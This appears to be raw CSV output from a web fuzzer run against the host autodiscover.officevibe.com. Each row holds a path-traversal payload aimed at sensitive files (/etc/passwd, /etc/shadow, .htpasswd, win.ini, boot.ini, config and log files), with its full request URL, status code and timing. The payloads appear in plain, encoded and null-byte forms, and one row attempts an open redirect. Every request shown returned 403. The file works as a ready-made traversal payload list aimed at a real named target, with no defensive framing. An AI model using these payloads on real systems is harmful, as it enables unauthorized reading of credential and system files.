FUZZ,url,redirectlocation,position,status_code,content_length,content_words,content_lines,content_type,duration,resultfile
RASHTML5Gateway//..\\\..\\\..\\\..\\\..\\\windows\win.ini,http://autodiscover.officevibe.com/RASHTML5Gateway//..\\\..\\\..\\\..\\\..\\\windows\win.ini,,168885,403,312,17,7,text/html; charset=us-ascii,7.46061ms,
./../../../../../../../../../../etc/shadow,http://autodiscover.officevibe.com/./../../../../../../../../../../etc/shadow,,170300,403,312,17,7,text/html; charset=us-ascii,13.433487ms,
../config.dat,http://autodiscover.officevibe.com/../config.dat,,175059,403,312,17,7,text/html; charset=us-ascii,7.113625ms,
../apache/logs/access.log,http://autodiscover.officevibe.com/../apache/logs/access.log,,175197,403,312,17,7,text/html; charset=us-ascii,7.41422ms,
../www,http://autodiscover.officevibe.com/../www,,175254,403,312,17,7,text/html; charset=us-ascii,7.518046ms,
../config.asp,http://autodiscover.officevibe.com/../config.asp,,179031,403,312,17,7,text/html; charset=us-ascii,9.915886ms,
./.././..//etc/passwd,http://autodiscover.officevibe.com/./.././..//etc/passwd,,181131,403,312,17,7,text/html; charset=us-ascii,13.596001ms,
..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cboot.ini,http://autodiscover.officevibe.com/..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cboot.ini,,183471,403,312,17,7,text/html; charset=us-ascii,7.758675ms,
error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini,http://autodiscover.officevibe.com/error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini,,186200,403,312,17,7,text/html; charset=us-ascii,7.393196ms,
../.htpasswd,http://autodiscover.officevibe.com/../.htpasswd,,186603,403,312,17,7,text/html; charset=us-ascii,7.638205ms,
lib/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,http://autodiscover.officevibe.com/lib/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,,188596,403,312,17,7,text/html; charset=us-ascii,7.005626ms,
../..//etc/passwd,http://autodiscover.officevibe.com/../..//etc/passwd,,193029,403,312,17,7,text/html; charset=us-ascii,9.285353ms,
static/../../../../windows/win.ini,http://autodiscover.officevibe.com/static/../../../../windows/win.ini,,201012,403,312,17,7,text/html; charset=us-ascii,6.804769ms,
%2e%2e//google.com,http://autodiscover.officevibe.com/%2e%2e//google.com,,202957,403,312,17,7,text/html; charset=us-ascii,9.353869ms,
../../../..//etc/passwd;index.html,http://autodiscover.officevibe.com/../../../..//etc/passwd;index.html,,203432,403,312,17,7,text/html; charset=us-ascii,9.739411ms,
modx/assets/cache/docid_1/../../../../../../../etc/passwd\0.pageCache.php,http://autodiscover.officevibe.com/modx/assets/cache/docid_1/../../../../../../../etc/passwd\0.pageCache.php,,206747,403,312,17,7,text/html; charset=us-ascii,12.385975ms,
/./../.../boot.ini,http://autodiscover.officevibe.com//./../.../boot.ini,,208978,403,312,17,7,text/html; charset=us-ascii,9.730427ms,
